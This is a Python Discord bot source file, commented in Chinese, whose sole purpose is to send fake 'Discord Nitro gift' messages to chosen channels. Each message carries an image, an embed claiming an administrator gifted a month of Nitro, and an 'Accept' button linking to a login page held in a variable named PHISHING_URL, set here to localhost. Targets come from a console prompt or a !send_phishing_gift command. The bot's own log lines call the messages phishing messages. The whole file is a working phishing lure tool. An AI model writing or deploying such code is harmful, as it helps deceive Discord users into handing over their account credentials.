import discord
from discord.ext import commands
import asyncio
import threading
from queue import Queue
import os
from PIL import Image
import io
from dotenv import load_dotenv

# 載入環境變數
load_dotenv()
TOKEN = os.getenv('TOKEN')  # 注意這裡使用 'TOKEN' 而不是 'BOT_TOKEN'

# 設置 intents
intents = discord.Intents.default()
intents.message_content = True

# 建立 Bot
bot = commands.Bot(command_prefix='!', intents=intents)

PHISHING_URL = "http://localhost:5000/login.html"

# 建立指令佇列
command_queue = Queue()

async def process_commands():
    """處理從終端機接收的指令"""
    while True:
        if not command_queue.empty():
            channel_id = command_queue.get()
            try:
                channel = bot.get_channel(int(channel_id))
                if channel:
                    # Process image with PIL
                    image_path = os.path.join(os.path.dirname(__file__), "discordgift.png")
                    with Image.open(image_path) as img:
                        img = img.resize((1920, 1080), Image.Resampling.LANCZOS)
                        img_bytes = io.BytesIO()
                        img.save(img_bytes, format='PNG')
                        img_bytes.seek(0)
                        
                        file = discord.File(img_bytes, filename="discordgift.png")
                    
                    embed = discord.Embed(
                        title="** 有人將訂閱作為禮物送給您了！**",
                        description="Discord Nitro代送服務管理員帳號 將1個月的 Nitro 當作禮物贈送給您！",
                        color=0x2f3136
                    )
                    embed.set_image(url="attachment://discordgift.png")
                    
                    view = discord.ui.View()
                    button = discord.ui.Button(
                        style=discord.ButtonStyle.primary,
                        label="接受",
                        url=PHISHING_URL
                    )
                    view.add_item(button)
                    
                    await channel.send(
                        file=file,
                        embed=embed,
                        view=view
                    )
                    print(f"已發送釣魚訊息到頻道 {channel_id}")
                else:
                    print(f"找不到頻道 ID: {channel_id}")
            except Exception as e:
                print(f"發送訊息時發生錯誤: {e}")
        await asyncio.sleep(1)

def console_input():
    """處理終端機輸入"""
    while True:
        try:
            cmd = input("請輸入頻道 ID (輸入 'exit' 結束): ")
            if cmd.lower() == 'exit':
                os._exit(0)
            if cmd.isdigit():
                command_queue.put(cmd)
                print(f"指令已加入佇列，將發送到頻道 {cmd}")
            else:
                print("請輸入有效的頻道 ID（純數字）")
        except Exception as e:
            print(f"輸入處理錯誤: {e}")

@bot.event
async def on_ready():
    print(f'{bot.user.name} 已上線!')
    print(f'前綴: {bot.command_prefix}')
    print("請在下方輸入要發送釣魚訊息的頻道 ID")
    bot.loop.create_task(process_commands())

@bot.command()
@commands.has_permissions(manage_guild=True)
async def send_phishing_gift(ctx, channel_id: int = None):
    if channel_id is None:
        await ctx.send("使用方式: !send_phishing_gift <頻道ID>\n例如: !send_phishing_gift 123456789")
        return
        
    try:
        target_url = PHISHING_URL
        
        # Process image with PIL
        image_path = os.path.join(os.path.dirname(__file__), "discordgift.png")
        with Image.open(image_path) as img: 
            img = img.resize((1920, 1080), Image.Resampling.LANCZOS)  
            img_bytes = io.BytesIO()
            img.save(img_bytes, format='PNG')
            img_bytes.seek(0)

            file = discord.File(img_bytes, filename="discordgift.png")
        
        embed = discord.Embed(
            title="** 有人將訂閱作為禮物送給您了！**",
            description="Discord Nitro代送服務管理員帳號 將1個月的 Nitro 當作禮物贈送給您！",
            color=0x2f3136
        )
        embed.set_image(url="attachment://discordgift.png")
        
        # button
        view = discord.ui.View()
        button = discord.ui.Button(
            style=discord.ButtonStyle.primary,
            label="接受",
            url=target_url
        )
        view.add_item(button)

        # 發送訊息時包含檔案
        channel = bot.get_channel(channel_id)
        if channel:
            await channel.send( 
                file=file,  # 加檔案
                embed=embed, 
                view=view
            )
        else:
            await ctx.send(f"not found {channel_id}")

    except Exception as e:
        await ctx.send(f"something wrong: {e}")
        print(f"Error sending message: {e}")

if __name__ == "__main__":
    if TOKEN is None:
        print("錯誤：請在 .env 檔案中設置 TOKEN")
        exit()

    # 啟動終端機輸入處理執行緒
    input_thread = threading.Thread(target=console_input, daemon=True)
    input_thread.start()

    try:
        bot.run(TOKEN)
    except discord.errors.LoginFailure:
        print("登入失敗！請檢查 Token 是否正確")
    except Exception as e:
        print(f"發生錯誤: {e}")